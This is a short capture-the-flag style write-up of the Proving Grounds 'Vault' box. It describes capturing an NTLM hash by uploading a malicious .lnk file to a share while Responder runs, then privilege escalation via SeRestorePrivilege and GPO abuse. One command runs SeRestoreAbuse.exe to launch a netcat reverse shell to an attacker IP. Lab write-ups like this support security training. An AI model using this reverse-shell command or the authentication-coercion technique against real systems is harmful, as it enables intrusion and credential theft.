# Vault — Proving Grounds (write-up)

**Difficulty:** Intermediate
**Box:** Vault (Proving Grounds)
**Author:** dkrxhn
**Date:** 2025-05-08

---

## TL;DR

### Enumeration revealed a file upload point. Uploaded a malicious `.lnk` file to coerce authentication via Responder, cracked the hash. Escalation attempted via SeRestorePrivilege (unstable) and ultimately through GPO abuse.
---
## Target info

- Services discovered via nmap
---
## Enumeration

![Nmap results](images/vault-pg_1.png)

![Service details](images/vault-pg_2.png)

![Web enumeration](images/vault-pg_3.png)

![Additional enumeration](images/vault-pg_4.png)

![Share access](images/vault-pg_5.png)

---
## Foothold

Started Responder and uploaded a malicious `.lnk` file (renamed `test.lnk` to `doc.lnk`):

```bash
sudo responder -I tun0
```

![Responder capture](images/vault-pg_6.png)

![LNK upload](images/vault-pg_7.png)

![Hash captured](images/vault-pg_8.png)

Cracked the hash and authenticated.

---
## Privesc

![Backup privilege check](images/vault-pg_9.png)

BackupPrivilege path failed because the administrator user does not have RDP access.

SeRestorePrivilege path:

```
.\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.45.247 4444 -e powershell.exe"
```

![SeRestoreAbuse](images/vault-pg_10.png)

Works but then crashes -- unstable.

GPO abuse path:

![GPO abuse](images/vault-pg_11.png)

---
## Lessons & takeaways

- Malicious `.lnk` files on writable shares can coerce NTLMv2 authentication via Responder
- SeRestorePrivilege can be exploited but may be unstable depending on the binary
- GPO abuse is a reliable alternative when other privilege escalation paths are unreliable
---
